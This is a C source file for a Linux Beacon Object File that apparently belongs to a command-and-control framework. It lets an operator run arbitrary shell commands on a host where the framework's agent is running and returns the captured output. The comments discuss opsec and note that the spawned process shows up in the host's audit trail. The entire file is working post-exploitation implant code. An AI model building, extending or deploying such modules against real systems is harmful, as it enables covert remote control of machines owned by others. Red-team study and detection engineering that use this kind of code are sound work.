/*
 * exec.c — run a shell command on a C agent, as a Linux BOF.
 *
 * The agent exposes one primitive here: ExecCmd runs the command line in a
 * child process — through `/bin/sh -c`, or directly after word splitting —
 * captures its combined stdout/stderr and returns the bytes. This object owns
 * the argument handling, the mode, the output buffer and the printing, so the
 * same source builds for RV32 and runs through the interpreter on non-x86-64 C
 * agents.
 *
 * Process spawning is not opsec: the child appears in the host's process table
 * and audit trail, and its command line is readable by any process monitor. The
 * C2 warns the operator before dispatching this module.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define CALLBACK_OUTPUT 0x0
#define CALLBACK_ERROR 0x0d

/* Must match C2_EXEC_OUT_MAX in the agent's bof_host.c: a buffer that fills up
 * means the agent stopped capturing, and this object says so. */
#define EXEC_OUT_CAP (64 * 1024)
#define EXEC_ERR_CAP 160

typedef struct {
  char *buffer;
  int length;
  int size;
} datap;

/* The argument block is the Windows COFFLoader wire format: a 4-byte body
 * length followed by length-prefixed values. Parsing it here keeps the object
 * free of the x86-only syscall helpers in bof_common, so the same source also
 * builds for RV32. */
static void BeaconDataParse(datap *parser, char *buffer, int size) {
  if (parser == NULL)
    return;
  parser->buffer = buffer;
  parser->length = 0;
  parser->size = 0;
  if (buffer == NULL || size < 4)
    return;
  int body = 0;
  memcpy(&body, buffer, 4);
  int available = size - 4;
  if (body < 0 || body > available)
    body = available;
  parser->buffer = buffer + 4;
  parser->length = body;
  parser->size = body;
}

static char *BeaconDataExtract(datap *parser, int *size) {
  if (size != NULL)
    *size = 0;
  if (parser == NULL || parser->length < 4)
    return NULL;
  int len = 0;
  memcpy(&len, parser->buffer, 4);
  parser->buffer += 4;
  parser->length -= 4;
  if (len < 0 || len > parser->length)
    return NULL;
  char *out = parser->buffer;
  parser->buffer += len;
  parser->length -= len;
  if (size != NULL)
    *size = len;
  return out;
}

extern void BeaconPrintf(int type, const char *fmt, ...);
extern void BeaconOutput(int type, const char *data, int len);
extern int ExecCmd(const char *cmd, int shell, char *out, int out_cap,
                   char *err, int err_cap);

void go(char *args, int len) {
  datap parser;
  BeaconDataParse(&parser, args, len);

  int cmd_len = 0;
  char *cmd = BeaconDataExtract(&parser, &cmd_len);
  if (cmd == NULL || cmd_len <= 0) {
    BeaconPrintf(CALLBACK_ERROR, "exec: missing command");
    return;
  }

  /* "shell" (default) runs through /bin/sh -c; "exec" splits the command line
   * into words and execs the program directly, so no shell is involved. */
  int shell = 1;
  int mode_len = 0;
  char *mode = BeaconDataExtract(&parser, &mode_len);
  if (mode != NULL && mode_len > 0) {
    char mode_z[16];
    int copy =
        mode_len < (int)sizeof(mode_z) - 1 ? mode_len : (int)sizeof(mode_z) - 1;
    memcpy(mode_z, mode, (size_t)copy);
    mode_z[copy] = '\0';
    size_t mode_used =
        strlen(mode_z); /* a packed terminator is not part of it */
    if (mode_used == 4 && memcmp(mode_z, "exec", 4) == 0) {
      shell = 0;
    } else if (!(mode_used == 5 && memcmp(mode_z, "shell", 5) == 0)) {
      BeaconPrintf(CALLBACK_ERROR, "exec: invalid mode %s", mode_z);
      return;
    }
  }

  char *cmd_z = (char *)malloc((size_t)cmd_len + 1);
  char *out = (char *)malloc(EXEC_OUT_CAP);
  if (cmd_z == NULL || out == NULL) {
    free(cmd_z);
    free(out);
    BeaconPrintf(CALLBACK_ERROR, "exec: out of memory");
    return;
  }
  memcpy(cmd_z, cmd, (size_t)cmd_len);
  cmd_z[cmd_len] = '\0';
  /* The packer may hand over a zero-length value as a lone NUL. */
  if (cmd_z[0] == '\0') {
    free(cmd_z);
    free(out);
    BeaconPrintf(CALLBACK_ERROR, "exec: missing command");
    return;
  }

  char err[EXEC_ERR_CAP];
  err[0] = '\0';
  int rc = ExecCmd(cmd_z, shell, out, EXEC_OUT_CAP, err, (int)sizeof(err));
  free(cmd_z);

  if (rc < 0) {
    BeaconPrintf(CALLBACK_ERROR, "exec: %s", err[0] != '\0' ? err : "failed");
    free(out);
    return;
  }
  if (rc > 0) {
    /* Raw bytes, not a format string: command output may contain '%'. */
    BeaconOutput(CALLBACK_OUTPUT, out, rc);
    if (out[rc - 1] != '\n')
      BeaconOutput(CALLBACK_OUTPUT, "\n", 1);
    if (rc == EXEC_OUT_CAP - 1)
      BeaconPrintf(CALLBACK_ERROR, "exec: output truncated at %d bytes", rc);
  }
  free(out);
}
